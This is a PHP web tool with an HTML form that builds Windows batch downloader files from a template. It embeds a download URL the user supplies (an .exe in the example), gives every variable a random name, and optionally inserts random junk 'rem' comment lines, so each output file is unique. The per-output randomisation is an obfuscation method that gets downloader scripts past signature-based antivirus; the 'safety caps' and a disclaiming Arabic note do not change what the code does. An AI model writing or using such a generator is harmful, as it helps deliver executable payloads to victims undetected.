<?php
// generate.php
// Requires template.bat in same folder.
// This script randomizes variable names inside template.bat and optionally inserts random 'rem' comments.
// Safety caps: MAX_COMMENT_LENGTH = 500, MAX_COMMENTS_PER_SPOT = 20.

declare(strict_types=1);

function rnd_id(int $len = 8): string {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $alnum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $s = $chars[random_int(0, strlen($chars) - 1)];
    for ($i = 1; $i < $len; $i++) {
        $s .= $alnum[random_int(0, strlen($alnum) - 1)];
    }
    return $s;
}

function random_string(int $length): string {
    $pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $poolLen = strlen($pool);
    $out = '';
    for ($i = 0; $i < $length; $i++) {
        $out .= $pool[random_int(0, $poolLen - 1)];
    }
    return $out;
}

function randomize_template(string $tpl, string $url): string {
    // keys present in template.bat (case-insensitive)
    $keys = ['URL','TEMP_DIR','LOGFILE','RETRIES','COUNT','RAND','FILE'];
    $map = [];
    foreach ($keys as $k) {
        // generate distinct random uppercase-ish names
        $map[$k] = rnd_id(6);
    }

    // replace placeholder first
    $tpl = str_replace('%DOWNLOAD_URL%', $url, $tpl);

    // Replace set VAR= patterns, %VAR% and !VAR!
    foreach ($map as $orig => $rand) {
        // set VAR=  (case-insensitive)
        $tpl = preg_replace_callback('/\bset\s+' . preg_quote($orig, '/') . '\s*=/i', function($m) use($rand){
            return 'set ' . $rand . '=';
        }, $tpl);
        $tpl = str_ireplace('!' . $orig . '!', '!' . $rand . '!', $tpl);
        $tpl = str_ireplace('%' . $orig . '%', '%' . $rand . '%', $tpl);
    }

    // Insert a few harmless blank lines in safe spots (header area & before :DOWNLOAD)
    $lines = preg_split("/\r\n|\n|\r/", $tpl);
    $n = count($lines);
    if ($n > 3) {
        array_splice($lines, min(2, $n), 0, array_fill(0, random_int(1,2), ''));
    }
    for ($i = 0; $i < count($lines); $i++) {
        if (preg_match('/^\s*:DOWNLOAD\b/i', $lines[$i])) {
            array_splice($lines, $i, 0, array_fill(0, random_int(1,2), ''));
            break;
        }
    }

    $final = implode("\r\n", $lines);
    // Remove accidental Arabic characters if any
    $final = preg_replace('/[\p{Arabic}]/u', '', $final);
    return $final;
}

function insert_random_comments(string $batContent, int $minLen, int $maxLen, int $minCount, int $maxCount, int $maxPerSpot = 20): string {
    // Enforce safety caps
    $MAX_COMMENT_LENGTH = 500;
    $CAP_COMMENTS_PER_SPOT = max(1, (int)$maxPerSpot); // caller may set smaller
    if ($maxLen > $MAX_COMMENT_LENGTH) $maxLen = $MAX_COMMENT_LENGTH;
    if ($minLen < 1) $minLen = 1;
    if ($minLen > $maxLen) $minLen = $maxLen;

    if ($minCount < 1) $minCount = 1;
    if ($maxCount < $minCount) $maxCount = $minCount;
    if ($maxCount > $CAP_COMMENTS_PER_SPOT) $maxCount = $CAP_COMMENTS_PER_SPOT;

    $lines = preg_split("/\r\n|\n|\r/", $batContent);
    $outLines = [];
    foreach ($lines as $line) {
        $outLines[] = $line;

        // Decide if we insert comments after this line.
        // We'll insert a random number between minCount and maxCount with 50% probability to avoid extreme bloat.
        if (random_int(0,1) === 1) {
            $count = random_int($minCount, $maxCount);
            for ($i = 0; $i < $count; $i++) {
                $len = random_int($minLen, $maxLen);
                // generate a random string of length $len
                // but to keep it Windows-safe and readable, produce chunks joined by underscore if len large
                $chunkSize = 60;
                $parts = [];
                $remaining = $len;
                while ($remaining > 0) {
                    $take = min($chunkSize, $remaining);
                    $parts[] = random_string($take);
                    $remaining -= $take;
                }
                $commentText = implode('_', $parts);
                // ensure we don't introduce quotes that break anything (we use rem so it's fine)
                $commentLine = 'rem ' . $commentText;
                $outLines[] = $commentLine;
            }
        }
    }

    return implode("\r\n", $outLines);
}


// --- Main handler ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $url = trim($_POST['url'] ?? '');
    if ($url === '') {
        header('Content-Type: text/plain; charset=utf-8');
        echo "Enter a download URL.";
        exit;
    }
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        header('Content-Type: text/plain; charset=utf-8');
        echo "Invalid URL.";
        exit;
    }

    $tpl_path = __DIR__ . DIRECTORY_SEPARATOR . 'template.bat';
    if (!is_readable($tpl_path)) {
        header('Content-Type: text/plain; charset=utf-8');
        echo "template.bat not found in script folder.";
        exit;
    }

    $tpl = file_get_contents($tpl_path);
    $out = randomize_template($tpl, $url);

    // Check if user requested comments (checkbox name 'comments' expected)
    $enableComments = isset($_POST['comments']) && ($_POST['comments'] === '1' || $_POST['comments'] === 'on');

    if ($enableComments) {
        // Read optional numeric parameters; apply defaults if missing or invalid
        $minLen = isset($_POST['min_len']) ? (int)$_POST['min_len'] : 50;
        $maxLen = isset($_POST['max_len']) ? (int)$_POST['max_len'] : 120;
        $minCount = isset($_POST['min_count']) ? (int)$_POST['min_count'] : 1;
        $maxCount = isset($_POST['max_count']) ? (int)$_POST['max_count'] : 3;

        // Sanitize sensible ranges
        if ($minLen < 1) $minLen = 1;
        if ($maxLen < $minLen) $maxLen = $minLen;
        if ($maxLen > 500) $maxLen = 500; // absolute cap
        if ($minCount < 1) $minCount = 1;
        if ($maxCount < $minCount) $maxCount = $minCount;
        if ($maxCount > 20) $maxCount = 20; // safety cap per spot

        $out = insert_random_comments($out, $minLen, $maxLen, $minCount, $maxCount, 20);
    }

    // final cleanup: ensure no Arabic inside BAT
    $out = preg_replace('/[\p{Arabic}]/u', '', $out);

    $fname = 'generated_' . bin2hex(random_bytes(4)) . '.bat';
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $fname . '"');
    header('Content-Length: ' . strlen($out));
    echo $out;
    exit;
}

// If accessed directly, show a minimal HTML form (for convenience)
?><!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8">
<title>Batch Generator</title>
<style>
body{font-family:system-ui,Segoe UI,Arial;padding:22px;background:#f5f7fb;color:#111}
label{display:block;margin:6px 0}
input[type=text], input[type=number]{width:60%;padding:8px;font-size:15px}
button{padding:8px 12px;margin-top:8px}
.small{font-size:13px;color:#444}
</style>
</head>
<body>
<h3>Batch Generator (with optional random comments)</h3>
<form method="post">
    <label>Download URL:
        <input type="text" name="url" placeholder="https://example.com/file.exe" required>
    </label>

    <label>
        <input type="checkbox" name="comments" value="1">
        Insert random REM comments between lines
    </label>

    <div style="margin-left:18px">
      <label>Comment length min:
        <input type="number" name="min_len" value="50" min="1" max="500">
      </label>
      <label>Comment length max:
        <input type="number" name="max_len" value="120" min="1" max="500">
      </label>
      <label>Comments per spot min:
        <input type="number" name="min_count" value="1" min="1" max="20">
      </label>
      <label>Comments per spot max:
        <input type="number" name="max_count" value="3" min="1" max="20">
      </label>
      <p class="small">ملاحظة: الحد الأقصى المسموح به لكل موضع تعليقات هو 20 لتعليل الأمان وعدم توليد ملفات ضخمة أو محاولة إخفاء نوايا السكربت.</p>
    </div>

    <button type="submit">Generate & Download</button>
</form>
</body>
</html>
